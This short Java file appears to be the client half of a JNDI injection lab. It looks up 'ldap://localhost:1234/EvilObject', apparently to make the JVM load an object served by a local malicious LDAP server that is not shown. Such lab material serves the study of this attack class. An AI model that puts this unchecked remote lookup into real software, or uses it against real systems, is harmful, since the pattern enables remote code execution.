import javax.naming.Context;
import javax.naming.InitialContext;
import javax.naming.NamingException;

public class LdapClient {
    public static void main(String[] args) throws Exception{
        try {
            Context ctx = new InitialContext();
            ctx.lookup("ldap://localhost:1234/EvilObject");
            String data = "This is LDAP Client.";
            //System.out.println(serv.service(data));
        }
        catch (NamingException e) {
            // TODO Auto-generated catch block
            e.printStackTrace();
        }
    }
}